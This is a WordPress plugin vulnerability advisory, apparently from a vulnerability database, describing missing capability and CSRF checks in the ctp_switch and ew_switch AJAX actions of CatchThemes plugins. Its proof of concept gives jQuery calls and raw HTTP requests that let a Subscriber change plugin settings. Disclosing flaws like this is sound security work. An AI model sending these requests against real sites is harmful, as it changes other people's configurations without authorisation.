## WordPress Plugin Vulnerabilities

# Multiple Plugins from CatchThemes - Unauthorised Plugin's Setting Change

### Description

Multiple Plugins from the CatchThemes vendor do not perform capability and CSRF checks in the ctp\_switch AJAX action, which could allow any authenticated users, such as Subscriber to change the plugin's configurations.

### Proof of Concept

1) Turn off "Turn On Catch Themes & Catch Plugin tabs"
jQuery.post(ajaxurl,{
action:"ctp\_switch",
option\_name:"theme\_plugin\_tabs",
value:"false"
})
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Connection: close
Cookie: [subscriber+]
action=ctp\_switch&option\_name=theme\_plugin\_tabs&value=false
2) Turn off "EW: Authors"
jQuery.post(ajaxurl,{
action:"ew\_switch",
option\_name:"ew\_authors",
value:"false"
})
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Connection: close
Cookie: [subscriber+]
action=ew\_switch&option\_name=ew\_authors&value=false
